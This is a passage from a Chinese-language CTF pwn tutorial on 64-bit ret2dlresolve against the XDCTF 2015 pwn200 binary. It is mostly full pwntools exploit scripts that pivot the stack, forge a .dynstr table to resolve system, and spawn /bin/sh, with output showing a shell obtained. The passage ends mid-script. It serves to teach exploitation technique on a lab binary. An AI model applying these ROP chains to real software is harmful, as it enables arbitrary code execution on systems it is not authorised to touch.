offset <span class="token operator">=</span> <span class="token number">112</span><span class="token operator">+</span><span class="token number">8</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
payload1 <span class="token operator">=</span> csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>new_stack<span class="token punctuation">,</span>stack_size<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x400607</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">256</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># gdb.attach(io)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># construct fake stack</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x600988</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># modify .dynstr pointer in .dynamic section to a specific location</span>
dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>data<span class="token punctuation">(</span><span class="token punctuation">)</span>
dynstr <span class="token operator">=</span> dynstr<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x600B30</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># construct a fake dynstr section</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x600B30</span><span class="token operator">+</span>len<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># read /bin/sh\x00</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x0000000000400771</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#pop rsi; pop r15; ret; </span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x0000000000400773</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop rdi; ret</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x600B30</span><span class="token operator">+</span>len<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x400516</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># the second instruction of read@plt </span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># print(len(rop.chain()))</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span>stack_size<span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment" spellcheck="true"># reuse the vuln to stack pivot</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>new_stack<span class="token punctuation">)</span>
<span class="token keyword">assert</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">256</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># now, we are on the new stack</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0x600B30</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fake dynstr location</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fake dynstr</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最终执行效果如下</p>
<pre><code>❯ python exp-no-relro-stack-pivot.py
[+] Starting local process './main_no_relro_64': pid 41149
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './main_no_relro_64'
[*] Switching to interactive mode
$ ls
exp-no-relro-stack-pivot.py  main_no_relro_64</code></pre><p>到了这里我们发现，与 32 位不同，在 64 位下进行栈迁移然后利用 ret2dlresolve 攻击需要精心构造栈的位置，以避免破坏 .dynamic 节的内容。</p>
<p>这里我们同时给出另外一种方法，即通过多次使用 vuln 函数进行漏洞利用。这种方式看起来会更加清晰一些。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true"># context.log_level="debug"</span>
<span class="token comment" spellcheck="true"># context.terminal = ["tmux","splitw","-h"]</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>

bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
csu_front_addr <span class="token operator">=</span> <span class="token number">0x400750</span>
csu_end_addr <span class="token operator">=</span> <span class="token number">0x40076A</span>
leave_ret  <span class="token operator">=</span><span class="token number">0x40063c</span>
poprbp_ret <span class="token operator">=</span> <span class="token number">0x400588</span>
<span class="token keyword">def</span> <span class="token function">csu</span><span class="token punctuation">(</span>rbx<span class="token punctuation">,</span> rbp<span class="token punctuation">,</span> r12<span class="token punctuation">,</span> r13<span class="token punctuation">,</span> r14<span class="token punctuation">,</span> r15<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true"># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class="token comment" spellcheck="true"># rbx = 0</span>
    <span class="token comment" spellcheck="true"># rbp = 1, enable not to jump</span>
    <span class="token comment" spellcheck="true"># r12 should be the function that you want to call</span>
    <span class="token comment" spellcheck="true"># rdi = edi = r13d</span>
    <span class="token comment" spellcheck="true"># rsi = r14</span>
    <span class="token comment" spellcheck="true"># rdx = r15</span>
    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>csu_end_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_front_addr<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span>
    <span class="token keyword">return</span> payload

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Welcome to XDCTF2015~!\n'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># stack privot to bss segment, set rsp = new_stack</span>
stack_size <span class="token operator">=</span> <span class="token number">0x200</span> <span class="token comment" spellcheck="true"># new stack size is 0x200</span>
new_stack <span class="token operator">=</span> bss_addr<span class="token operator">+</span><span class="token number">0x100</span>

<span class="token comment" spellcheck="true"># modify .dynstr pointer in .dynamic section to a specific location</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>
offset <span class="token operator">=</span> <span class="token number">112</span><span class="token operator">+</span><span class="token number">8</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x600988</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x400607</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>rop<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">256</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0x600B30</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token comment" spellcheck="true"># construct a fake dynstr section</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>data<span class="token punctuation">(</span><span class="token punctuation">)</span>
dynstr <span class="token operator">=</span> dynstr<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x600B30</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x400607</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># read /bin/sh\x00</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>csu<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> <span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x600B30</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">+</span>len<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x400607</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>


rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_no_relro_64"</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x0000000000400771</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#pop rsi; pop r15; ret; </span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x0000000000400773</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x600B30</span><span class="token operator">+</span><span class="token number">0x100</span><span class="token operator">+</span>len<span class="token punctuation">(</span>dynstr<span class="token punctuation">)</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0x400516</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># the second instruction of read@plt </span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token operator">-</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>rop<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Partial-RELRO-1"><a href="#Partial-RELRO-1" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p>还是利用 2015 年 xdctf 的 pwn200 进行介绍。</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ gcc -fno-stack-protector -z relro  -no-pie ../../main.c -o main_partial_relro_64
❯ checksec main_partial_relro_64
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里我们仍然以手工构造和基于工具构造两种方式来介绍 64 位下的 ret2dlresolve。</p>
<h4 id="手工伪造-1"><a href="#手工伪造-1" class="headerlink" title="手工伪造"></a>手工伪造</h4><p>这里我们就不一步步展示了。直接采用最终的思路。</p>
<h5 id="64-位的变化"><a href="#64-位的变化" class="headerlink" title="64 位的变化"></a>64 位的变化</h5><p>首先，我们先来看一下 64 位中的一些变化。</p>
<p>glibc 中默认编译使用的是 <code>ELF_Rela</code> 来记录重定位项的内容</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span>
<span class="token punctuation">{</span>
  Elf64_Addr        r_offset<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/* Address */</span>
  Elf64_Xword        r_info<span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">/* Relocation type and symbol index */</span>
  Elf64_Sxword        r_addend<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/* Addend */</span>
<span class="token punctuation">}</span> Elf64_Rela<span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">/* How to extract and insert information held in the r_info field.  */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> ELF64_R_SYM(i)                        ((i) >> 32)</span>
<span class="token macro property">#<span class="token directive keyword">define</span> ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)</span>
<span class="token macro property">#<span class="token directive keyword">define</span> ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里 Elf64_Addr、Elf64_Xword、Elf64_Sxword 都为 64 位，因此 Elf64_Rela 结构体的大小为 24 字节。</p>
<p>根据 IDA 里的重定位表的信息可以知道，write 函数在符号表中的偏移为 1（0x100000007h&gt;&gt;32） 。</p>
<pre class="line-numbers language-assembly"><code class="language-assembly">LOAD:0000000000400488 ; ELF JMPREL Relocation Table
LOAD:0000000000400488                 Elf64_Rela <601018h, 100000007h, 0> ; R_X86_64_JUMP_SLOT write
LOAD:00000000004004A0                 Elf64_Rela <601020h, 200000007h, 0> ; R_X86_64_JUMP_SLOT strlen
LOAD:00000000004004B8                 Elf64_Rela <601028h, 300000007h, 0> ; R_X86_64_JUMP_SLOT setbuf
LOAD:00000000004004D0                 Elf64_Rela <601030h, 400000007h, 0> ; R_X86_64_JUMP_SLOT read
LOAD:00000000004004D0 LOAD            ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>确实在符号表中的偏移为 1。</p>
<pre class="line-numbers language-shell"><code class="language-shell">LOAD:00000000004002C0 ; ELF Symbol Table
LOAD:00000000004002C0      Elf64_Sym <0>
LOAD:00000000004002D8      Elf64_Sym <offset aWrite - offset byte_400398, 12h, 0, 0, 0, 0> ; "write"
LOAD:00000000004002F0      Elf64_Sym <offset aStrlen - offset byte_400398, 12h, 0, 0, 0, 0> ; "strlen"
LOAD:0000000000400308      Elf64_Sym <offset aSetbuf - offset byte_400398, 12h, 0, 0, 0, 0> ; "setbuf"
LOAD:0000000000400320      Elf64_Sym <offset aRead - offset byte_400398, 12h, 0, 0, 0, 0> ; "read"
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在 64 位下，Elf64_Sym 结构体为</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span>
<span class="token punctuation">{</span>
  Elf64_Word        st_name<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/* Symbol name (string tbl index) */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">char</span>        st_info<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/* Symbol type and binding */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_other<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/* Symbol visibility */</span>
  Elf64_Section        st_shndx<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/* Section index */</span>
  Elf64_Addr        st_value<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/* Symbol value */</span>
  Elf64_Xword        st_size<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/* Symbol size */</span>
<span class="token punctuation">}</span> Elf64_Sym<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其中</p>
<ul>
<li>Elf64_Word 32 位</li>
<li>Elf64_Section 16 位</li>
<li>Elf64_Addr 64 位</li>
<li>Elf64_Xword 64位</li>
</ul>
<p>所以，Elf64_Sym 的大小为 24 个字节。</p>
<p>除此之外，在 64 位下，plt 中的代码 push 的是待解析符号在重定位表中的索引，而不是偏移。比如，write 函数 push 的是 0。</p>
<pre class="line-numbers language-assembly"><code class="language-assembly">.plt:0000000000400510 ; ssize_t write(int fd, const void *buf, size_t n)
.plt:0000000000400510 _write          proc near               ; CODE XREF: main+B3↓p
.plt:0000000000400510                 jmp     cs:off_601018
.plt:0000000000400510 _write          endp
.plt:0000000000400510
.plt:0000000000400516 ; ---------------------------------------------------------------------------
.plt:0000000000400516                 push    0
.plt:000000000040051B                 jmp     sub_400500<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="First-Try-leak"><a href="#First-Try-leak" class="headerlink" title="First Try - leak"></a>First Try - leak</h5><p>根据上述的分析，我们可以写出如下脚本</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true"># context.log_level="debug"</span>
<span class="token comment" spellcheck="true"># context.terminal = ["tmux","splitw","-h"]</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_64"</span><span class="token punctuation">)</span>

